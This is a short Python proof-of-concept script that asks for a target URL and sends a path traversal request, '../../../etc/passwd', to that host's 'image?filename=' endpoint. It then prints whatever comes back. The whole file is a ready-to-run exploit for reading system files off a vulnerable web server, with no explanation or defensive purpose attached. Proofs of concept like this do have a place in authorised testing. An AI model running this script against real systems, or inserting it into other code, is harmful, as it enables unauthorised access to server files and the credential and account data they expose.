import os
import urllib3
import json

class PSPOC:

	def Penetration(host):
		try:
			http = urllib3.PoolManager()
			payload ='../../../etc/passwd'
			url = host+'image?filename='+payload
			result = http.request('GET', url)
			print(result.data)
		except:
			print("Cannot Penetrate")

host = input("Enter url: ")
PSPOC.Penetration(host)


